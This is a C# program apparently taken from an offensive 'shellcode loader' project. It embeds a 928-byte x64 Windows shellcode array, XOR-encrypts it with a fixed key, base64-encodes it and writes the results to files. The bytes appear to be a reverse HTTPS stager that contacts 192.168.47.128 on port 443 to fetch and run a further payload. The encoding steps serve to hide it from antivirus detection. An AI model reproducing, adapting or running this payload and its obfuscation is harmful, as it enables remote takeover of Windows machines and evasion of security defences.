using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ShellcodeLoaderGPT
{
    internal class Encryptions
    {
        static byte[] XOR(byte[] inputBytes)
        {
            // Constant key 
            byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF };

            // Create a new byte array to store the encrypted data
            byte[] encryptedBytes = new byte[inputBytes.Length];

            // Apply XOR operation to each byte in inputBytes using corresponding byte in keyBytes
            for (int i = 0; i < inputBytes.Length; i++)
            {
                encryptedBytes[i] = (byte)(inputBytes[i] ^ keyBytes[i % keyBytes.Length]);
            }

            string hexString = BitConverter.ToString(encryptedBytes);

            string output = $"byte[] byteArray = new byte[] {{ 0x{hexString.Replace("-", ", 0x")} }};";

            using (StreamWriter sw = new StreamWriter("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\Encryptions\\obj\\Debug\\xor.txt"))
            {
                sw.WriteLine(output);
            }

            return encryptedBytes;
        }

        static byte[] base64(byte[] inputBytes)
        {
            // Encode inputBytes in base64 format
            string base64String = Convert.ToBase64String(inputBytes);

            // Output encoded string in base64 format
            using (StreamWriter sw = new StreamWriter("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\Encryptions\\obj\\Debug\\base64.txt"))
            {
                sw.WriteLine(base64String);
            }

            // Decode the base64 string to a byte array
            byte[] decodedBytes = Convert.FromBase64String(base64String);

            // Output decoded byte array
            using (StreamWriter sw = new StreamWriter("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\Encryptions\\obj\\Debug\\base64decoded.txt"))
            {
                foreach (byte b in decodedBytes)
                {
                    sw.Write(b + " ");
                }
            }

            return decodedBytes;
        }


        static void Main(string[] args)
        {
            // Replace the following placeholder with your shellcode
            byte[] shellcode = new byte[928] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x4f, 0x42, 0x7a, 0x52, 0x00, 0xb5, 0x2f, 0xa2, 0xda, 0xd6, 0x08, 0x83, 0x34, 0x7f, 0xe0, 0xaa, 0x42, 0x87, 0xc1, 0x02, 0xe8, 0x96, 0x92, 0xe5, 0x13, 0xee, 0x60, 0x84, 0xab, 0x72, 0x67, 0x35, 0x44, 0xee, 0x34, 0xc7, 0x6b, 0xd4, 0x51, 0x62, 0x87, 0xf3, 0x97, 0x85, 0x45, 0x02, 0x40, 0x6b, 0xda, 0xf7, 0x72, 0xef, 0x6e, 0x1a, 0xc1, 0x2f, 0xd0, 0xa1, 0xbe, 0xab, 0xcf, 0xdc, 0x87, 0x06, 0x0b, 0x19, 0x4f, 0xd6, 0xb5, 0xcc, 0x1f, 0xdb, 0xaf, 0x36, 0x7a, 0x64, 0xee, 0xe9, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4d, 0x41, 0x4c, 0x43, 0x29, 0x0d, 0x0a, 0x00, 0x5a, 0xfb, 0xb6, 0x23, 0x13, 0x35, 0x69, 0x2e, 0xeb, 0xee, 0xa8, 0x32, 0x2d, 0xdc, 0x89, 0xfd, 0x02, 0xab, 0xdf, 0x41, 0xaa, 0xaa, 0x54, 0xf2, 0x44, 0x7b, 0x57, 0xa0, 0x98, 0xec, 0x9c, 0x73, 0x1d, 0xb9, 0x8f, 0xbf, 0xf6, 0xb9, 0x99, 0x81, 0x82, 0xd0, 0x1d, 0xa8, 0x9a, 0xd3, 0xd5, 0x16, 0x8e, 0x29, 0xc0, 0x23, 0x4a, 0xeb, 0xd3, 0xea, 0xeb, 0x69, 0x8f, 0xa7, 0xdd, 0x55, 0x8d, 0x89, 0x96, 0x19, 0x82, 0xaf, 0x30, 0x89, 0x65, 0xad, 0x59, 0xc9, 0x6f, 0x53, 0x25, 0x6d, 0x54, 0x30, 0xba, 0xee, 0x63, 0x1d, 0xc9, 0x41, 0x3f, 0x72, 0xf0, 0xe3, 0xa4, 0x48, 0x19, 0x1a, 0xb8, 0x95, 0x0e, 0xef, 0x48, 0x38, 0x92, 0xf0, 0x43, 0xe4, 0xfb, 0xb4, 0xb0, 0x4c, 0x1e, 0x09, 0xa4, 0xc1, 0xdb, 0x7d, 0x27, 0x38, 0xfa, 0x12, 0xc7, 0x9d, 0x97, 0xed, 0x50, 0x11, 0x74, 0xa4, 0x60, 0xdf, 0xee, 0xb9, 0x2f, 0xa1, 0xea, 0x59, 0x0f, 0xe5, 0x61, 0x74, 0x3b, 0xd4, 0x0e, 0x2e, 0xac, 0xa9, 0xbe, 0x00, 0x9c, 0xb8, 0xe8, 0xbb, 0x7b, 0xed, 0x21, 0x38, 0x02, 0x92, 0x9e, 0xa5, 0x33, 0x34, 0x6d, 0xc9, 0xfe, 0xa9, 0xc0, 0xaa, 0x83, 0x1c, 0xc4, 0x06, 0x19, 0xd0, 0x8c, 0xdf, 0x86, 0x4a, 0xb2, 0x96, 0x72, 0x1e, 0x0c, 0x0b, 0x7d, 0x31, 0xfa, 0x0b, 0xf9, 0x77, 0x89, 0xd7, 0x25, 0xc1, 0x4a, 0xc0, 0xc8, 0xac, 0x55, 0xe7, 0x7e, 0xc1, 0x75, 0xe1, 0x12, 0x11, 0x37, 0x55, 0x0a, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x34, 0x37, 0x2e, 0x31, 0x32, 0x38, 0x00, 0x3a, 0xde, 0x68, 0xb1 };

            // Xor encryption
            byte[] output = XOR(shellcode);

            // Base64 encoding
            base64(output);



        }
    }
}
